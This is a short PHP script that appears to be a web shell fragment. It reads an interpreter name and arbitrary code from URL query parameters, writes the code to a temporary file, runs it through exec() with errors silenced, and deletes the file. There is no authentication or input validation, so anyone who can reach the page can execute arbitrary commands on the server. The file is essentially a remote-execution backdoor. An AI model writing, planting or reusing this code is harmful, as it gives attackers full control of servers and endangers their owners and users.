<?php
function exe($s_c){
	echo "start";
    $s_out = "";
    $s_c = $s_c." 2>&1";

    @exec($s_c,$s_out);
    return $s_out;
}

$s_lang = $_GET['lang'];
$s_code = $_GET['evalcode'];
$s_tmpdir = getcwd();
$s_rand = md5(time().rand(0,100));
$s_script = $s_tmpdir.$s_rand;
file_put_contents($s_script, $s_code);
$s_res = exe($s_lang." ".$s_evaloption." ".$s_script);
unlink($s_script);

?>